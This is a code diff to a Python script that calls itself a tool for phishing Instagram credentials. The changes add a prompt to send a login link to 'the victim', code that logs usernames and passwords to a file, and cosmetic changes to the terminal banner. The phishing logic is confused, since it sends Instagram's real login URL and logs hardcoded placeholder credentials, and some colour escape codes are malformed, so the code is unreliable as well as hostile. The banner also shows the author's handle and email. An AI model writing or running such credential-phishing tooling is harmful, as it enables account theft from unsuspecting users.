@@ -24,7 +24,7 @@ def check_root():
 
 def main():
     print("\033[92mCHECKING IF YOU'RE ROOTED...")
-    loading_symbols = ["/", "-", "\\", "|"]
+    loading_symbols = ["⠋", "⠙", "⠚", "⠞", "⠟", "⠠", "⠡", "⠢"]
     i = 0
     while True:
         print(loading_symbols[i % len(loading_symbols)] + "\r", end="")
@@ -36,7 +36,7 @@ def main():
         print("YOU'RE ROOTED.")
         return 1
     else:
-        print("YOU'RE NOT ROOTED.")
+        print("\003[1;31YOU'RE NOT ROOTED.\003[0m")
         return 0
 
 
@@ -50,23 +50,26 @@ subprocess.run(["sudo", "apt-get", "install", "-y", "php", "git", "curl", "pytho
 # Install npm
 subprocess.run(["sudo", "apt-get", "install", "-y", "npm"])
 
+# Clear the terminal screen
+os.system('clear' if os.name == 'posix' else 'cls')
+
 # Display info
 print("\033[92m\n\n")
-print("\033[92m ______                          _____        ______              _____        ______       _____                   ")
+print("\033[31m ______                          _____        ______              _____        ______       _____                   ")
 print("\033[92m |     |     |       |     |     |            |     |     /\     |      \     |            |                        ")
-print("\033[92m |_____/     |       |     |     |____        |_____/    /  \    |       |    | ____       | ____                   ")
+print("\033[31m |_____/     |       |     |     |____        |_____/    /  \    |       |    | ____       | ____                   ")
 print("\033[92m |     \     |       |     |     |            |     \   /____\   |       |    |      \     |                        ")
-print("\033[92m |_____|     |____   |_____|     |_____****** |_____|  /      \  |_____ /     |______|     |_____                   ")
+print("\033[31m |_____|     |____   |_____|     |_____****** |_____|  /      \  |_____ /     |______|     |_____                   ")
 
 print("\033[92m\n\n")
-print("\033[92m         ***********************************************")
-print("\033[92m         #                                             #")
+print("\033[31m         ***********************************************")
+print("\033[31m         #                                             #")
 print("\033[92m         #   tool For fishing IG credentials           #")
 print("\033[92m         #   Follow Me On Github: @ephraim sib         #")
 print("\033[92m         #   Contact Me In: ephraimsibale20@gmail.com  #")
 print("\033[92m         #   Changelog: 5-12-2023                      #")
-print("\033[92m         #                                             #")
-print("\033[92m         ***********************************************")
+print("\033[31m         #                                             #")
+print("\033[31m         ***********************************************")
 print("\033[92m\n\n")
 
 # Prompt user to enter a port number
@@ -82,7 +85,7 @@ def run_server():
             print("Invalid port number. Please enter a valid port number.")
 
     # Configure logging to write to a file
-    logging.basicConfig(filename='instagram_login.log', filemode='w', format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
+    logging.basicConfig(filename='server.log', filemode='w', format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
 
     # Print start message
     print(f"Starting server on port {port}")
@@ -103,6 +106,10 @@ def run_server():
         # Open Instagram login page
         driver.get('https://www.instagram.com/accounts/login/')
 
+
+         # Get the login page URL
+        login_url = driver.current_url
+
         # Get user credentials (replace with actual credentials)
         username = "your_username"
         password = "your_password"
@@ -116,10 +123,19 @@ def run_server():
         password_input.send_keys(password)
         login_button.click()
 
+        # Send the login page URL to the victim
+        print(f"Send the following link to the victim: {login_url}")
+
+
         # Wait for the login to complete
         WebDriverWait(driver, 10).until(EC.url_to_be('https://www.instagram.com/'))
 
-        # Check if the user has a blue badge (verified account)
+
+         # Log the entered credentials to the console and server.log
+        print(f"Username: {username}, Password: {password}")
+        logging.info(f"Username: {username}, Password: {password}")
+
+          # Check if the user has a blue badge (verified account)
         blue_badge_element = driver.find_element(By.CSS_SELECTOR, 'svg[aria-label="Verified"]')
         blue_badge_status = blue_badge_element.is_displayed()
 
@@ -131,18 +147,18 @@ def run_server():
     except Exception as e:
         print(f"An error occurred: {e}")
 
-    #Run the node.js server in a separate thread 
-    threading.Thread(target=lambda: subprocess.run(["node", "server.js", str(port)])).start()
+      #Run the node.js server in a separate thread 
+    threading.Thread(target=lambda: subprocess.run(["node", "server.js", str(port)], cwd=os.path.dirname(__file__))).start()
        
-    # Create the server
+      # Create the server
     with socketserver.TCPServer(("", int(port)), MyRequestHandler) as httpd:
         print(f"Server is running on port {port}")
 
-   # Generate the link
+       # Generate the link
         link = f"http://localhost:{port}/"
         print(f"Generated link: {link}")
 
-        # Serve forever
+            # Serve forever
         httpd.serve_forever()
 
 if __name__ == "__main__":
